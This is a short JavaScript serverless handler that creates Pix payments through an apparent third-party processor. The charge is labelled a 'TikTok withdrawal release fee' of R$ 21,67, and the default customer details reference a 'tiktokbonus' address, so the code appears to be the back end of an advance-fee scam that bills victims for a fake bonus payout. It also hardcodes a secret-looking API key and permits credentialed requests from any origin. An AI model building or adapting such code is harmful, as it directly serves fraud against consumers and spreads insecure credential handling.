export default async function handler(req, res) {
  // Configuração de CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método não permitido' });
  }

  try {
    const { name, email, phone, document: doc, amount } = req.body || {};

    const flevoApiKey = process.env.FLEVO_API_KEY || 'flevopay_sk_d3b0446c6e1e204324edf4e0a9d0fcab966745357d3e882d8c328381543aabd7';

    const payload = {
      amount: amount || 2167, // R$ 21,67 em centavos
      description: 'Taxa de Liberacao de Saque - TikTok',
      reference: `SAQUE-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      source: 'api_externa',
      customer: {
        name: name || 'Usuario TikTok',
        email: email || 'cliente@tiktokbonus.com',
        phone: phone || '11999998888',
        document: doc || '06782811400',
      },
    };

    const response = await fetch('https://pagamento-processador.org.ua/api/v1/transaction', {
      method: 'POST',
      headers: {
        'X-API-Key': flevoApiKey,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const data = await response.json();
    return res.status(200).json(data);
  } catch (error) {
    console.error('Erro ao gerar Pix FlevoPay:', error);
    return res.status(500).json({ error: 'Erro ao gerar Pix', details: error.message });
  }
}
